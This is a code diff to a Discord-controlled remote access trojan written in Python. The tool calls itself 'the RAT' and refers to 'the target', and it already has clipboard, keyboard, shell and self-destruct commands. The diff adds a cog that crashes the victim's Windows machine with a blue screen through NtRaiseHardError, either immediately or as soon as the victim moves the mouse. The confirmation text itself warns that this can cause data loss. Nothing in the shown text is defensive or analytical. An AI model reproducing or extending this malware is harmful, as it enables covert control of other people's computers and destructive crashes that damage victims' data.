@@ -39,7 +39,7 @@ class MyBot(commands.Bot):
         # self is the bot here
         print(f"Logged in as: {self.user}")
 
-        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog]
+        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog, bluescreen_cog]
                 
         if isWindows:
             windows_cog_classes = []
@@ -336,7 +336,7 @@ async def destruct():
 
 @bot.command(name="self-destruct")
 async def destruct_command(ctx):
-    confirm = await confirm_action(ctx, action_description="Are you sure you want to self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
+    confirm = await confirm_action(ctx, action_description="self-destruct? **THIS WILL DELETE THE PROGRAM FROM THE TARGET, AN ACTION THAT CANNOT BE UNDONE**")
 
     if confirm:
         embed = embed_data(title="Self-destruct", description="Self-destruction started", color=discord.Color.red())
@@ -807,7 +807,14 @@ if isWindows:
 
     # BLuescreen functions
 
-    def bluescreen():
+class bluescreen_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    def cog_unload(self):
+        self.bluescreen_mouse.stop()
+
+    def bluescreen(self):
         import ctypes
         
         ntdll = ctypes.windll.ntdll
@@ -818,21 +825,48 @@ if isWindows:
 
         if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
             print("BSOD Successfull!")
-            return 0
+            success = 0
         else:
             print("BSOD Failed...")
-            return 1
+            success = 1
         
-    @bot.command(name="bluescreen")
-    async def run_bluescreen(ctx):
-        success = bluescreen()
-
         if success == 0:
             embed = embed_data(title="Bluescreen", description="Bluescreen successfully thrown")
         elif success == 1:
             embed = embed_data(title="Bluescreen", description="Bluescreen failed", color=discord.Color.red())
 
-        await ctx.send(embed=embed)
+        return embed
+        
+    @tasks.loop(seconds=1)
+    async def bluescreen_mouse(self, ctx, old_x, old_y):
+        x, y = pyautogui.position()
+        print(old_x, old_y)
+        print(x, y)
+        if x != old_x and y != old_y:
+            print("BLUESCREEN")
+            self.bluescreen_mouse.stop()
+            embed = self.bluescreen()
+            await ctx.send(embed=embed)
+        else:
+            pass
+        
+    
+    @commands.command(name="bluescreen")
+    async def run_bluescreen(self, ctx, arg=None):
+        confirm = await confirm_action(ctx, action_description="bluescreen your target, this can lead to data loss and if the RAT doesnt have persistance it will remove your ability to connect to your target")
+
+        if confirm:
+            if arg == "mouse":
+                old_x, old_y = pyautogui.position()
+                self.bluescreen_mouse.start(ctx, old_x, old_y)
+            else:
+                embed = self.bluescreen()
+
+                await ctx.send(embed=embed)
+        else:
+            embed = embed_data(title="Bluescreen", description="Bluescreen operation was cancelled", color=discord.Color.red())
+            await ctx.send(embed=embed)
+
 
 # Running the bot
     
